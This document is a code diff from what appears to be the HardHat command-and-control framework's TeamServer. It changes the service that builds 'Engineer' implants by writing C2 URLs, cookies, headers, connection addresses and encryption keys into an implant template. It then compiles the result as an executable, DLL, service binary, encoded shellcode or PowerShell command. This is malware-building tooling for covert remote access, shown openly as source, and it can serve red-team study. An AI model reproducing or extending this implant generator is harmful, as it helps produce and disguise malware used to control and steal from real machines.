@@ -1,53 +1,24 @@
-﻿using ApiModels.Requests;
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Threading;
-using System.Threading.Tasks;
-using ApiModels.Requests;
 using ApiModels.Shared;
 using TeamServer.Models;
 using TeamServer.Models.Extras;
 using TeamServer.Models.Managers;
 using TeamServer.Utilities;
-using Microsoft.AspNetCore.Mvc;
+using ApiModels.Plugin_Interfaces;
+using Microsoft.AspNetCore.Mvc.Formatters;
 
 namespace TeamServer.Services
 {
-    public interface IEngineerService
+
+    public class EngineerService
     {
-        void AddEngineer(Engineer Engineer);
-        IEnumerable<Engineer> GetEngineers();
-        Engineer GetEngineer(string id);
-        void RemoveEngineer(Engineer Engineer);
-    }
-
-    public class EngineerService : IEngineerService
-    {
-        public static readonly List<Engineer> _engineers = new();
-
-        public void AddEngineer(Engineer Engineer)
-        {
-            _engineers.Add(Engineer);
-        }
-        public IEnumerable<Engineer> GetEngineers()
-        {
-            return _engineers;
-        }
-        public Engineer GetEngineer(string id)
-        {
-            return GetEngineers().FirstOrDefault(a => a.engineerMetadata.Id.Equals(id));
-        }
-        public void RemoveEngineer(Engineer Engineer)
-        {
-            _engineers.Remove(Engineer);
-        }
-
-        public static bool CreateEngineers(SpawnEngineerRequest request, out string result_message)
-
+        public static bool CreateEngineers(IExtImplantCreateRequest request, out string result_message)
         {
             {
                 char allPlatformPathSeperator = Path.DirectorySeparatorChar;
@@ -96,9 +67,10 @@ namespace TeamServer.Services
                                 file = file.Replace("{{REPLACE_ISSECURE_STATUS}}", "True");
                             }
                             //update some C2 Profile stuff 
-                            file = file.Replace("{{REPLACE_URLS}}", manager.c2Profile.Urls);
-                            file = file.Replace("{{REPLACE_COOKIES}}", manager.c2Profile.Cookies);
-                            file = file.Replace("{{REPLACE_REQUEST_HEADERS}}", manager.c2Profile.RequestHeaders);
+                            file = file.Replace("{{REPLACE_URLS}}", string.Join(",", manager.c2Profile.Urls));
+                            file = file.Replace("{{REPLACE_EVENT_URLS}}", string.Join(",", manager.c2Profile.EventUrls));
+                            file = file.Replace("{{REPLACE_COOKIES}}", string.Join(",", manager.c2Profile.Cookies));
+                            file = file.Replace("{{REPLACE_REQUEST_HEADERS}}", string.Join(",", manager.c2Profile.RequestHeaders));
                             file = file.Replace("{{REPLACE_USERAGENT}}", manager.c2Profile.UserAgent);
                             //update file with ConnectionIP and ConnectionPort from request
                             file = file.Replace("{{REPLACE_CONNECTION_IP}}", managerConnectionAddress);
@@ -175,29 +147,39 @@ namespace TeamServer.Services
                 file = file.Replace("{{REPLACE_MESSAGE_PATH_KEY}}", Encryption.UniversialMessagePathKey); // used on C2 messages 
                 file = file.Replace("{{REPLACE_METADATA_KEY}}", Encryption.UniversialMetadataKey); // used on the metadata id header which is used to verify the implant is talking to the correct teamserver
 
+                //this gets updated after the first checkIn
+                Console.WriteLine($"setting task encryption key to {Encryption.UniversalTaskEncryptionKey}");
                 file = file.Replace("{{REPLACE_UNIQUE_TASK_KEY}}", Encryption.UniversalTaskEncryptionKey);
 
                 file = file.Replace("{{REPLACE_KILL_DATE}}", request.KillDateTime.ToString());
 
-                if (request.implantType == ImplantType.Engineer)
-                {
-                    Console.WriteLine("Implant is an engineer");
-                    file = file.Replace("{{REPLACE_IMPLANT_TYPE}}", Encryption.EncryptImplantName("Engineer"));
-                }
-                else if (request.implantType == ImplantType.Constructor)
-                {
-                    Console.WriteLine("Implant is a constructor");
-                    file = file.Replace("{{REPLACE_IMPLANT_TYPE}}", Encryption.EncryptImplantName("Constructor"));
-                }
+
+                Console.WriteLine("Implant is an engineer");
+                file = file.Replace("{{REPLACE_IMPLANT_TYPE}}", Encryption.EncryptImplantName("Engineer"));
 
                 //TESTING OF DATACHUNKING 
-                //file = file.Replace("{{REPLACE_CHUNK_SIZE}}", "50");
-                //file = file.Replace("{{REPLACE_CHUNK_DATA}}", "true");
+                file = file.Replace("{{REPLACE_CHUNK_SIZE}}", request.ChunkSize.ToString());
+                file = file.Replace("{{REPLACE_CHUNK_DATA}}", request.IsChunkEnabled.ToString());
                 //END OF TESING CODE
 
                 //generate code for the implant
-                List<string> nonIncCommands = Directory.GetFiles(pathSplit[0] + $"..{allPlatformPathSeperator}Engineer{allPlatformPathSeperator}Commands{allPlatformPathSeperator}", "*.cs").ToList().Where(x => !request.IncludedCommands.Contains(Path.GetFileNameWithoutExtension(x), StringComparer.CurrentCultureIgnoreCase)).ToList();
-                List<string> nonIncModules = Directory.GetFiles(pathSplit[0] + $"..{allPlatformPathSeperator}Engineer{allPlatformPathSeperator}Modules{allPlatformPathSeperator}", "*.cs").ToList().Where(x => !request.IncludedModules.Contains(Path.GetFileNameWithoutExtension(x), StringComparer.CurrentCultureIgnoreCase)).ToList();
+                //if the request strings for included commands or modules is equal to all then include all commands or modules
+                //otherwise only include the commands or modules that are in the request
+                List<string> nonIncCommands = new();
+                List<string> nonIncModules = new();
+                if (!request.IncludedCommands[0].Equals("All", StringComparison.CurrentCultureIgnoreCase))
+                {
+                    nonIncCommands = Directory.GetFiles(pathSplit[0] + $"..{allPlatformPathSeperator}Engineer{allPlatformPathSeperator}Commands{allPlatformPathSeperator}", "*.cs").ToList().Where(x => !request.IncludedCommands.Contains(Path.GetFileNameWithoutExtension(x), StringComparer.CurrentCultureIgnoreCase)).ToList();
+                }
+                //extra check because modules are optional so you might have 0
+                if (request.IncludedModules.Count > 0)
+                {
+                    if (!request.IncludedModules[0].Equals("All", StringComparison.CurrentCultureIgnoreCase))
+                    {
+                        nonIncModules = Directory.GetFiles(pathSplit[0] + $"..{allPlatformPathSeperator}Engineer{allPlatformPathSeperator}Modules{allPlatformPathSeperator}", "*.cs").ToList().Where(x => !request.IncludedModules.Contains(Path.GetFileNameWithoutExtension(x), StringComparer.CurrentCultureIgnoreCase)).ToList();
+                    }
+                }
+                
                 byte[] assemblyBytes = Utilities.Compile.GenerateEngCode(file, request.complieType, request.SleepType, nonIncCommands,nonIncModules);
                 if (assemblyBytes is null)
                 {
@@ -221,19 +203,19 @@ namespace TeamServer.Services
 
                     string outputLocation = "";
                     string sourceAssemblyLocation = "";
-                    if (request.complieType == EngCompileType.exe)
+                    if (request.complieType == ImpCompileType.exe)
                     {
                         outputLocation = pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.exe";
                         sourceAssemblyLocation = pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}.exe";
                         System.IO.File.WriteAllBytes(sourceAssemblyLocation, assemblyBytes);
                     }
-                    else if (request.complieType == EngCompileType.dll)
+                    else if (request.complieType == ImpCompileType.dll)
                     {
                         outputLocation = pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}.dll";
                         sourceAssemblyLocation = pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}.dll";
                         System.IO.File.WriteAllBytes(sourceAssemblyLocation, assemblyBytes);
                     }
-                    else if (request.complieType == EngCompileType.serviceexe)
+                    else if (request.complieType == ImpCompileType.serviceexe)
                     {
                         outputLocation = pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_service.exe";
                         sourceAssemblyLocation = pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}_service.exe";
@@ -246,16 +228,18 @@ namespace TeamServer.Services
                         System.IO.File.WriteAllBytes(sourceAssemblyLocation, assemblyBytes);
                     }
 
+                    var searchDir = $"{pathSplit[0]}Data{allPlatformPathSeperator}";
                     string TopLevelFolder = pathSplit[0] + $"..{allPlatformPathSeperator}"; //Main HardHat folder 
                     //string DynamicLoadingDllPath = TopLevelFolder + "DynamicEngLoading" + allPlatformPathSeperator + "bin" + allPlatformPathSeperator + "Debug" + allPlatformPathSeperator + "DynamicEngLoading.dll";
                     //string DynamicLoadingDllPath = pathSplit[0] + "Data" + allPlatformPathSeperator + "DynamicEngLoading.dll";
                     var jsonFastLocation = pathSplit[0] + "Data" + $"{allPlatformPathSeperator}fastJSON.dll";
                     var dynLoadingLocation = pathSplit[0] + "Data" + $"{allPlatformPathSeperator}loading.dll";
+                    var inputSimLocation = pathSplit[0] + "Data" + $"{allPlatformPathSeperator}WindowsInput.dll";
+                    //var csScriptLocation = pathSplit[0] + "Data" + $"{allPlatformPathSeperator}CSScriptLibrary.dll";
+                    string[] assemblyArray = { sourceAssemblyLocation, jsonFastLocation, dynLoadingLocation, inputSimLocation};
 
-                    var searchDir = $"{pathSplit[0]}Data{allPlatformPathSeperator}";
-
-                    string[] assemblyArray = { sourceAssemblyLocation, jsonFastLocation,dynLoadingLocation};
-                    if(request.IsPostEx)
+                    //?? denotes that if this is null then use the second value otherwise use the first value
+                    if(request.IsPostEx ?? false)
                     {
                         outputLocation = outputLocation.Replace("Engineer", "PostExEngineer");
                     }
@@ -309,7 +293,7 @@ namespace TeamServer.Services
 
                 HardHatHub.AddCompiledImplant(_compImp);
 
-                if (request.complieType == EngCompileType.exe)
+                if (request.complieType == ImpCompileType.exe)
                 {
                     try
                     {
@@ -333,7 +317,7 @@ namespace TeamServer.Services
                         return false;
                     }
                 }
-                else if (request.complieType == EngCompileType.serviceexe)
+                else if (request.complieType == ImpCompileType.serviceexe)
                 {
                     try
                     {
@@ -357,7 +341,7 @@ namespace TeamServer.Services
                         return false;
                     }
                 }
-                else if (request.complieType == EngCompileType.dll)
+                else if (request.complieType == ImpCompileType.dll)
                 {
                     try
                     {
@@ -381,18 +365,18 @@ namespace TeamServer.Services
                         return false;
                     }
                 }
-                else if (request.complieType == EngCompileType.shellcode)
+                else if (request.complieType == ImpCompileType.shellcode)
                 {
                     try
                     {
                         //call the shellcode utility giving it the path we just wrote this exe to then return the shellcode and write its content to a file 
                         var shellcodeLocation = pathSplit[0] + "temp" + $"{allPlatformPathSeperator}Engineer_{managerName}.exe";
                         var shellcode = Utilities.Shellcode.AssemToShellcode(shellcodeLocation, "");
-                        if ((bool)request.EncodeShellcode)
+                        if (request.EncodeShellcode != null && (bool)request.EncodeShellcode)
                         {
                             var encoded_shellcode = Shellcode.EncodeShellcode(shellcode);
                             System.IO.File.WriteAllBytes(
-                                pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_shellcode.bin",
+                                pathSplit[0] + ".." + $"{allPlatformPathSeperator}Engineer_{managerName}_shellcode_sgn.bin",
                                 encoded_shellcode);
                         }
                         else
@@ -419,7 +403,7 @@ namespace TeamServer.Services
                     }
                 }
                 //if request.compileType is powershellcmd then convert the assemnbly bytes to a base64 string 
-                else if (request.complieType == EngCompileType.powershellcmd)
+                else if (request.complieType == ImpCompileType.powershellcmd)
                 {
                     try
                     {
